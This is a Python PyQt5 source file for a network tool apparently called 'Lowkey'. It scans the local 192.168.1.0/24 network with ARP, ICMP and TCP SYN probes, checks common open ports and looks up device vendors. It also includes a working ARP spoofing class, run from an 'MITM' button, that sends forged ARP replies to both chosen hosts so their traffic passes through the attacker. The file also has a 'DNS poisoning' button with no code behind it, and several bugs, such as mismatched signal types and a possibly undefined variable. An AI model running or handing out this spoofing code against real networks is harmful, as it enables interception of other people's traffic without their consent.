# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'Lowkey.ui'
#
# Created by: PyQt5 UI code generator 5.15.10
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets
from time import sleep
from PyQt5.QtCore import QObject
from scapy.all import *
import socket
from mac_vendor_lookup import MacLookup

class Ui_MainWindow(object):
    host_count=1
    current_hosts=[]
    port_scanner_threads=[]
    popular_ports = [
    20, 21, 22, 23, 25, 53, 80, 110, 115, 119,
    123, 143, 161, 194, 443, 465, 514, 587, 993, 995,
    1080, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443,
    8888, 9090, 9200, 9300, 27017, 28015, 5000, 54321, 6660,
    6669, 7001, 8000, 8005, 8081, 8444, 8880, 8883, 9207,
    11211, 27018, 27019, 28017, 50030, 50070, 8008, 8083, 8086,
    8333, 9418, 11211, 27018, 27019, 28017, 50030, 50070, 8008,
    8083, 8086, 8333, 9418, 27017, 5000, 54321, 6660, 6669,
    7001, 8000, 8005, 8081, 8444, 8880, 8883, 9207, 11211,
    27018, 27019, 28017, 50030, 50070, 8008, 8083, 8086, 8333,
    9418, 11211, 27018, 27019, 28017, 50030, 50070
]
    ICMP_isActive=False
    ARP_isActive=False
    TCP_isActive=False
    find_open_ports=False
    find_device=False
    find_mac=True
    mitm_isActive=False
    dns_spoofing_isActve=False
    scanTexteditHTML="""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Information</title>
    <style>
        table {
            width: 100%;
        }

        th, td {
            border: 1px solid #dddddd;
            text-align: center;
            padding: 8px;
        }

        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>

<table>
    <thead>
        <tr>
            <th>Sno.</th>
            <th>IP Address</th>
            <th>MAC Address</th>
            <th>Device</th>
            <th>Open Ports</th>
        </tr>
    </thead>
    <tbody>
    </tbody>
</table>

</body>
</html>"""
    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(804, 597)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setStyleSheet("")
        self.centralwidget.setObjectName("centralwidget")
        self.scan_textEdit = QtWidgets.QTextEdit(self.centralwidget)
        self.scan_textEdit.setGeometry(QtCore.QRect(-7, -1, 331, 431))
        self.scan_textEdit.setStyleSheet("\\")
        self.scan_textEdit.setObjectName("scan_textEdit")
        self.MITM_textedit = QtWidgets.QTextBrowser(self.centralwidget)
        self.MITM_textedit.setGeometry(QtCore.QRect(530, 1, 271, 271))
        self.MITM_textedit.setObjectName("MITM_textedit")
        self.DNS_poisoning_textedit = QtWidgets.QTextBrowser(self.centralwidget)
        self.DNS_poisoning_textedit.setGeometry(QtCore.QRect(530, 270, 271, 291))
        self.DNS_poisoning_textedit.setObjectName("DNS_poisoning_textedit")
        self.ICMP_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.ICMP_checkBox.setGeometry(QtCore.QRect(10, 440, 101, 22))
        self.ICMP_checkBox.setObjectName("ICMP_checkBox")
        self.ARP_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.ARP_checkBox.setGeometry(QtCore.QRect(10, 470, 89, 22))
        self.ARP_checkBox.setObjectName("ARP_checkBox")
        self.TCP_SYN_checkBox_3 = QtWidgets.QCheckBox(self.centralwidget)
        self.TCP_SYN_checkBox_3.setGeometry(QtCore.QRect(10, 500, 89, 22))
        self.TCP_SYN_checkBox_3.setObjectName("TCP_SYN_checkBox_3")
        self.line = QtWidgets.QFrame(self.centralwidget)
        self.line.setGeometry(QtCore.QRect(320, 100, 211, 20))
        self.line.setFrameShape(QtWidgets.QFrame.HLine)
        self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line.setObjectName("line")
        self.Souce_IP_label = QtWidgets.QLabel(self.centralwidget)
        self.Souce_IP_label.setGeometry(QtCore.QRect(330, 10, 81, 21))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.Souce_IP_label.setFont(font)
        self.Souce_IP_label.setObjectName("Souce_IP_label")
        self.Source_ip_dropdown = QtWidgets.QComboBox(self.centralwidget)
        self.Source_ip_dropdown.setGeometry(QtCore.QRect(410, 10, 121, 21))
        self.Source_ip_dropdown.setObjectName("Source_ip_dropdown")
        self.Target_IP_label_2 = QtWidgets.QLabel(self.centralwidget)
        self.Target_IP_label_2.setGeometry(QtCore.QRect(330, 40, 81, 21))
        font = QtGui.QFont()
        font.setPointSize(10)
        self.Target_IP_label_2.setFont(font)
        self.Target_IP_label_2.setObjectName("Target_IP_label_2")
        self.Target_ip_dropdown = QtWidgets.QComboBox(self.centralwidget)
        self.Target_ip_dropdown.setGeometry(QtCore.QRect(410, 40, 121, 20))
        self.Target_ip_dropdown.setObjectName("Target_ip_dropdown")
        self.line_2 = QtWidgets.QFrame(self.centralwidget)
        self.line_2.setGeometry(QtCore.QRect(100, 430, 20, 141))
        self.line_2.setFrameShape(QtWidgets.QFrame.VLine)
        self.line_2.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_2.setObjectName("line_2")
        self.MITM_button = QtWidgets.QPushButton(self.centralwidget)
        self.MITM_button.setGeometry(QtCore.QRect(320, 120, 211, 31))
        self.MITM_button.setObjectName("MITM_button")
        self.line_3 = QtWidgets.QFrame(self.centralwidget)
        self.line_3.setGeometry(QtCore.QRect(320, 150, 211, 20))
        self.line_3.setFrameShape(QtWidgets.QFrame.HLine)
        self.line_3.setFrameShadow(QtWidgets.QFrame.Sunken)
        self.line_3.setObjectName("line_3")
        self.Domain_name_combobox = QtWidgets.QComboBox(self.centralwidget)
        self.Domain_name_combobox.setGeometry(QtCore.QRect(330, 190, 191, 31))
        self.Domain_name_combobox.setObjectName("Domain_name_combobox")
        self.Domain_Label = QtWidgets.QLabel(self.centralwidget)
        self.Domain_Label.setGeometry(QtCore.QRect(330, 170, 56, 15))
        self.Domain_Label.setObjectName("Domain_Label")
        self.IP_address_label = QtWidgets.QLabel(self.centralwidget)
        self.IP_address_label.setGeometry(QtCore.QRect(330, 240, 71, 16))
        self.IP_address_label.setObjectName("IP_address_label")
        self.IP_address_combobox = QtWidgets.QComboBox(self.centralwidget)
        self.IP_address_combobox.setGeometry(QtCore.QRect(330, 260, 191, 31))
        self.IP_address_combobox.setObjectName("IP_address_combobox")
        self.ADD_button = QtWidgets.QPushButton(self.centralwidget)
        self.ADD_button.setGeometry(QtCore.QRect(330, 310, 91, 36))
        self.ADD_button.setObjectName("ADD_button")
        self.textEdit_2 = QtWidgets.QTextEdit(self.centralwidget)
        self.textEdit_2.setGeometry(QtCore.QRect(320, 350, 211, 151))
        self.textEdit_2.setObjectName("textEdit_2")
        self.DNS_poisoning_button = QtWidgets.QPushButton(self.centralwidget)
        self.DNS_poisoning_button.setGeometry(QtCore.QRect(320, 510, 211, 31))
        self.DNS_poisoning_button.setObjectName("DNS_poisoning_button")
        self.start_button = QtWidgets.QPushButton(self.centralwidget)
        self.start_button.setGeometry(QtCore.QRect(330, 70, 91, 31))
        self.start_button.setObjectName("start_button")
        self.stop_button = QtWidgets.QPushButton(self.centralwidget)
        self.stop_button.setGeometry(QtCore.QRect(430, 70, 91, 31))
        self.stop_button.setStyleSheet("")
        self.stop_button.setObjectName("stop_button")
        self.OPEN_ports_checkBox_2 = QtWidgets.QCheckBox(self.centralwidget)
        self.OPEN_ports_checkBox_2.setGeometry(QtCore.QRect(130, 440, 101, 22))
        self.OPEN_ports_checkBox_2.setObjectName("OPEN_ports_checkBox_2")
        self.mac_checkBox = QtWidgets.QCheckBox(self.centralwidget)
        self.mac_checkBox.setGeometry(QtCore.QRect(130, 500, 89, 22))
        self.mac_checkBox.setObjectName("mac_checkBox")
        self.device_checkBox_2 = QtWidgets.QCheckBox(self.centralwidget)
        self.device_checkBox_2.setGeometry(QtCore.QRect(130, 470, 89, 22))
        self.device_checkBox_2.setObjectName("device_checkBox_2")
        self.MITM_textedit.raise_()
        self.DNS_poisoning_textedit.raise_()
        self.ICMP_checkBox.raise_()
        self.ARP_checkBox.raise_()
        self.TCP_SYN_checkBox_3.raise_()
        self.line.raise_()
        self.Souce_IP_label.raise_()
        self.Source_ip_dropdown.raise_()
        self.Target_IP_label_2.raise_()
        self.Target_ip_dropdown.raise_()
        self.line_2.raise_()
        self.MITM_button.raise_()
        self.scan_textEdit.raise_()
        self.line_3.raise_()
        self.Domain_name_combobox.raise_()
        self.Domain_Label.raise_()
        self.IP_address_label.raise_()
        self.IP_address_combobox.raise_()
        self.ADD_button.raise_()
        self.textEdit_2.raise_()
        self.DNS_poisoning_button.raise_()
        self.start_button.raise_()
        self.stop_button.raise_()
        self.OPEN_ports_checkBox_2.raise_()
        self.mac_checkBox.raise_()
        self.device_checkBox_2.raise_()
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 804, 25))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.ICMP_checkBox.setText(_translate("MainWindow", "ICMP ECHO"))
        self.ARP_checkBox.setText(_translate("MainWindow", "ARP SCAN"))
        self.TCP_SYN_checkBox_3.setText(_translate("MainWindow", "TCP SYN"))
        self.Souce_IP_label.setText(_translate("MainWindow", "Source IP :"))
        self.Target_IP_label_2.setText(_translate("MainWindow", "Target IP :"))
        self.MITM_button.setText(_translate("MainWindow", "MITM"))
        self.Domain_Label.setText(_translate("MainWindow", "Domain : "))
        self.IP_address_label.setText(_translate("MainWindow", "IP Address :"))
        self.ADD_button.setText(_translate("MainWindow", "ADD"))
        self.DNS_poisoning_button.setText(_translate("MainWindow", "DNS poisoning"))
        self.start_button.setText(_translate("MainWindow", "Start"))
        self.stop_button.setText(_translate("MainWindow", "Stop"))
        self.OPEN_ports_checkBox_2.setText(_translate("MainWindow", "OPEN PORTS"))
        self.mac_checkBox.setText(_translate("MainWindow", "MAC ADDRESS"))
        self.device_checkBox_2.setText(_translate("MainWindow", "DEVICE"))
        self.mac_checkBox.setChecked(True)
        self.stop_button.setEnabled(False)
        self.MITM_button.setEnabled(False)
        self.DNS_poisoning_button.setEnabled(False)
        self.ARP_checkBox.setChecked(True)
        self.stop_button.clicked.connect(self.stop_clicked)
        self.scan_textEdit.setHtml(self.scanTexteditHTML)
        self.start_button.clicked.connect(self.start_clicked)
        self.MITM_button.clicked.connect(self.start_mitm)

    def start_mitm(self):
        target=self.Target_ip_dropdown.currentText()
        target_mac=self.Target_ip_dropdown.currentData()
        source=self.Source_ip_dropdown.currentText()
        source_mac=self.Source_ip_dropdown.currentData()
        self.mitm_target_thread=arp_spoofer(target,target_mac,source,source_mac)
        self.mitm_source_thread=arp_spoofer(source,source_mac,target,target_mac)
        self.mitm_target_thread.start()
        self.mitm_source_thread.start()
        self.mitm_isActive=True


    def start_clicked(self):
        self.host_count=0
        self.Source_ip_dropdown.clear()
        self.Target_ip_dropdown.clear()
        self.current_hosts.clear()
        self.stop_button.setEnabled(True)
        self.MITM_button.setEnabled(True)
        self.DNS_poisoning_button.setEnabled(True)
        self.scan_textEdit.setHtml(self.scanTexteditHTML)
        self.ICMP_checkBox.setEnabled(False)
        self.TCP_SYN_checkBox_3.setEnabled(False)
        self.ARP_checkBox.setEnabled(False)
        self.OPEN_ports_checkBox_2.setEnabled(False)
        self.device_checkBox_2.setEnabled(False)
        self.mac_checkBox.setEnabled(False)
        self.start_button.setEnabled(False)
        if self.ARP_checkBox.isChecked():
            self.start_arp_scan()
        if self.ICMP_checkBox.isChecked():
            self.start_icmp_scan()
        if self.TCP_SYN_checkBox_3.isChecked():
            self.start_tcp_syn_scan()
        self.find_open_ports=self.OPEN_ports_checkBox_2.isChecked()
        self.find_device=self.device_checkBox_2.isChecked()
        self.find_mac=self.mac_checkBox.isChecked()


    def stop_clicked(self):
        if self.TCP_isActive:
            self.tcp_syn_thread.terminate()
            self.TCP_isActive=False
        if self.ARP_isActive:
            self.arp_thread.terminate()
            self.ARP_isActive=False
        if self.ICMP_isActive:
            self.icmp_thread.terminate()
            self.ICMP_isActive=False
        self.ICMP_checkBox.setEnabled(True)
        self.TCP_SYN_checkBox_3.setEnabled(True)
        self.ARP_checkBox.setEnabled(True)
        self.start_button.setEnabled(True)
        if self.OPEN_ports_checkBox_2.isChecked():
            for thread in self.port_scanner_threads:
                thread.terminate()

    def start_arp_scan(self):
        self.arp_thread = WorkerThread()
        self.arp_thread.host_found.connect(self.handle_host_found)
        self.arp_thread.start()
        self.ARP_isActive=True

    
    def start_icmp_scan(self):
        # Create and start the ICMP thread
        self.icmp_thread = IcmpThread()
        self.icmp_thread.host_found.connect(self.handle_host_found)
        self.icmp_thread.start()
        self.ICMP_isActive=True

    def start_tcp_syn_scan(self):
        # Create and start the TCP SYN thread
        self.tcp_syn_thread = TcpSynThread()
        self.tcp_syn_thread.host_found.connect(self.handle_host_found)
        self.tcp_syn_thread.start()
        self.TCP_isActive=True

    def handle_host_found(self,IP_mac_list):
        for ip,mac in IP_mac_list:
            if ip not in self.current_hosts:
                self.host_count+=1
                self.Source_ip_dropdown.addItem(ip,mac)
                self.Target_ip_dropdown.addItem(ip,mac)
                if self.find_open_ports:
                    self.scan_open_ports(ip,self.host_count)
                if self.find_device:
                    try:
                        device_info=device_finder.lookup(mac)
                    except:
                        device_info='Not found'
                details=f"""<tr>
                    <td>{self.host_count}</td>
                    <td>{ip}</td>
                    <td>{mac if self.find_mac else 'None'}</td>
                    <td>{device_info if self.find_device else 'None'}</td>
                    <td>{f"{self.host_count}l..." if self.find_open_ports else 'None'}</td>
                </tr>"""
                current_html=self.scan_textEdit.toHtml()
                if "<tbody>" not in current_html:
                    # If not, create a new one
                    new_html = current_html.replace("</body>", "<tbody>" + details + "</tbody></body>")
                else:
                    # If yes, append to it
                    new_html = current_html.replace("</tbody>", details + "</tbody>")

                self.scan_textEdit.setHtml(new_html)
                self.current_hosts.append(ip)
    def scan_open_ports(self,ip,count):
        port_scanner_thread=port_scanner(ip,count)
        port_scanner_thread.ports_signal.connect(self.update_open_thread)
        port_scanner_thread.start()
        self.port_scanner_threads.append(port_scanner_thread)
    def update_open_thread(self,count,ports):
        previous_content=self.scan_textEdit.toHtml()
        for port in ports: 
            print(port)
        new_content=previous_content.replace(f"{count}l...",str(ports))
        print(f"{count}l... replaced  for {str(ports)}")
        self.scan_textEdit.setHtml(new_content)
class port_scanner(QtCore.QThread):
    ports_signal=QtCore.pyqtSignal(int,list)
    popular_ports = [
    20, 21, 22, 23, 25, 53, 80, 110, 115, 119,
    123, 143, 161, 194, 443, 465, 514, 587, 993, 995,
    1080, 1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443,
    8888, 9090, 9200, 9300, 27017, 28015, 5000, 54321, 6660,
    6669, 7001, 8000, 8005, 8081, 8444, 8880, 8883, 9207,
    11211, 27018, 27019, 28017, 50030, 50070, 8008, 8083, 8086,
    8333, 9418, 11211, 27018, 27019, 28017, 50030, 50070, 8008,
    8083, 8086, 8333, 9418, 27017, 5000, 54321, 6660, 6669,
    7001, 8000, 8005, 8081, 8444, 8880, 8883, 9207, 11211,
    27018, 27019, 28017, 50030, 50070, 8008, 8083, 8086, 8333,
    9418, 11211, 27018, 27019, 28017, 50030, 50070
]
   
    ports=[]
    def __init__(self, ip, count):
        super().__init__()
        self.ip=ip
        self.count=count
    def run(self):
        for port in self.popular_ports:
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(1)
            try:
                sock.connect((self.ip,port))
                self.ports.append(port)
                print(f"{port} found for {self.ip}")
            except:
                pass
        self.ports_signal.emit(self.count,self.ports)
        self.ports.clear()
class arp_spoofer(QtCore.QThread):
    def __init__(self,target_ip,target_mac, spoof_ip,spoof_mac):
        super().__init__()
        self.target=target_ip
        self.spoof=spoof_ip
        self.target_mac=target_mac
        self.spoof_mac=spoof_mac
        print(self.target,self.target_mac,self.spoof,self.spoof_mac)

    def run(self):
        arp_packet=ARP(pdst=self.target, hwdst=self.target_mac, psrc=self.spoof, op='is-at')

        while True:
            send(arp_packet,verbose=False)
            print(f"arp packet send target:{self.target} source:{self.spoof}")
            sleep(1)
    def get_mac(self,ip):
        arp_request=ARP(pdst=ip)
        broadcast=Ether(dst="ff:ff:ff:ff:ff:ff")
        answered_list=srp(broadcast/arp_request,verbose=False)[0]
        print(f"mac address for ip {ip} is {answered_list[0][1].hwsrc}")
        return answered_list[0][1].hwsrc
    

class TcpSynThread(QtCore.QThread):
    # Custom signal to send details of live hosts
    host_found = QtCore.pyqtSignal(str)

    def run(self):
        # Function to perform TCP SYN scan
        ip_list = self.scan_hosts()
        for ip in ip_list:
            self.host_found.emit(ip)

    def scan_hosts(self):
        target_ip = "192.168.1.1/24"  # Adjust the target IP range as needed
        port_range = range(1, 1025)  # Ports to scan, adjust as needed

        online_ips = []

        for ip_suffix in range(1, 255):
            ip = f"{target_ip[:-1]}{ip_suffix}"
            if self.tcp_syn_scan(ip, port_range):
                online_ips.append(ip)

        return online_ips

    def tcp_syn_scan(self, ip, ports):
        conf.verb = 0  # Suppress Scapy output

        for port in ports:
            response = sr(IP(dst=ip) / TCP(dport=port, flags="S"), timeout=1, verbose=0)

            if response and response[0][1].haslayer(TCP) and response[0][1][TCP].flags == 0x12:
                return True  # Port is open

        return False
    
class IcmpThread(QtCore.QThread):
    # Custom signal to send details of live hosts
    host_found = QtCore.pyqtSignal(list)

    def run(self):
        # Function to perform ICMP echo scan
        ip_list = self.scan_hosts()
        self.host_found.emit(ip_list)

    def scan_hosts(self):
        target_ip = "192.168.1.1/24"  # Adjust the target IP range as needed
        ip_list = []

        for ip_suffix in range(1, 255):
            ip = f"{target_ip[:-1]}{ip_suffix}"
            if self.ping(ip):
                ip_list.append(ip)

        return ip_list

    def ping(self, ip):
        # Run the ping command and capture the output
        try:
            result = subprocess.run(['ping', '-c', '1', ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, text=True)
            return "1 packets transmitted, 1 packets received" in result.stdout
        except subprocess.CalledProcessError:
            return False
device_finder=MacLookup()

class WorkerThread(QtCore.QThread):
    # Custom signal to send details of live hosts
    host_found = QtCore.pyqtSignal(list)

    def run(self):
        # Function to perform ARP scanning
        while True:
            ip_mac_list=self.scan_hosts()
            self.host_found.emit(ip_mac_list)
            sleep(0.5)
    def scan_hosts(self):
        target_ip = "192.168.1.1/24"  # Adjust the target IP range as needed
        arp_request = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request

        # Send and receive packets
        result = srp(packet, timeout=3, verbose=0)[0]
        result_list=[]
        for _,recieved in result:
            result_list.append([recieved.psrc,recieved.hwsrc])
        return result_list


if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())


